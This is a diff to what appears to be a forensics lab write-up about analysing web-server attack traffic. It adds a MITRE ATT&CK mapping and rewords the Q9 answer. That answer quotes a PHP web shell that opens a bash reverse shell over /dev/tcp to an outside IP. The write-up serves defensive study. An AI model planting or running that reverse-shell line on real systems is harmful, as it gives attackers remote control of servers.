@@ -11,6 +11,33 @@ As the lead analyst in this case, you are required to analyze the network traffi
 - [NetworkMiner](https://www.netresec.com/?page=NetworkMiner)
 - [CyberChef](https://gchq.github.io/CyberChef)
 
+## MITRE ATT&CK and MITRE DEF3ND
+
+### MITRE ATT&CK
+
+- Tactic: Reconnaissance [`TA0043`](https://attack.mitre.org/techniques/T1595/)
+  + Technique: Active Scanning: Wordlist Scanning [`T1595.003`](https://attack.mitre.org/techniques/T1595/003/)
+
+    Attacker use web content discovery tools to enumerate a website’s pages and directories.
+
+- Tactic: Initial Access [`TA0001`](https://attack.mitre.org/tactics/TA0001/)
+  + Technique: Exploit Public-Facing Application [`T1190`](https://attack.mitre.org/techniques/T1190/)
+
+    Attacker use tools to exploit XSS vulnerabilities.
+ 
+- Tactic: Persistence [`TA0003`](https://attack.mitre.org/tactics/TA0003/)
+  + Technique: Valid Accounts: Local Accounts [`T1078.003`](https://attack.mitre.org/techniques/T1078/003/)
+
+    Attacker retrieve and use legitimate local admin account credentials.
+
+- Tactic: Command and Control [`TA0011`](https://attack.mitre.org/tactics/TA0011/)
+  + Technique: Application Layer Protocol: Web Protocols [`T1071.001`](https://attack.mitre.org/techniques/T1071/001/)
+
+    Attacker use HTTPS for Command and Control which carries web traffic may be very common in environments. HTTPS packets have many fields and headers in which data can be concealed.
+
+### MITRE DEF3ND
+
+
 ## Questions
 
 ### Q1. By knowing the attacker's IP, we can analyze all logs and actions related to that IP and determine the extent of the attack, the duration of the attack, and the techniques used. Can you provide the attacker's IP?
@@ -136,7 +163,7 @@ In Credentials tab, web can see the last credentials is `admin:admin123`, so we 
 
 ### Q9. We need to determine if the attacker gained further access or control of our web server. What's the name of the malicious script uploaded by the attacker?
 
-Attacker create a reverse shell to gain further access from compromised web server to C&C: `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"111.224.250.131"/443 0>&1'");?>`
+Attacker create and upload file with a reverse shell to gain further access from compromised web server to C&C: `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"111.224.250.131"/443 0>&1'");?>`
 
 ![{C61C8527-DCC9-42D4-953B-793FE44EC322}](https://github.com/user-attachments/assets/deec52e9-0025-49f3-9b58-f3f821c8a057)
 
